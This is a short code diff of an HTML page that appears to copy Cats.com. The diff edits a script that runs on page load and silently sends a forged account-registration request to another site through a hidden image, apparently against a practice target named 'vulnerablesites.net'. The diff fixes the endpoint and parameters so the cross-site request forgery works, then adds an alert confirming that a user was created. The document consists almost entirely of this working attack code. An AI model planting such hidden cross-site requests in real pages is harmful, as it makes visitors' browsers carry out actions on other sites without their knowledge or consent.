@@ -4769,10 +4769,12 @@ Cats.com was created to help you get responsible, accurate information to give y
 
 <script>
   let date = +new Date()
-  let iframe = document.createElement('img')
-  iframe.src = `https://13-52-101-90-shred.vulnerablesites.net/Shred/register.action?username=${date}&email=${date}.com&password=${date}&password2=${date}&firstName=${date}&lastName=${date}&birthdayMonth=03&birthdayDay=10&birthdayYear=1955`
+  let img = document.createElement('img')
+  img.src = `https://13-52-101-90-shred.vulnerablesites.net/Shred/doRegister.action?username=${date}&email=${date}@test.com&password=${date}&password2=${date}&firstName=name&lastName=last&birthdayMonth=03&birthdayDay=10&birthdayYear=1955`
   img.style.display = 'none'
-  body.appendChild(img)
+  document.body.appendChild(img)
+
+  alert('a new user is created ' + date)
 </script>
 
 </body>
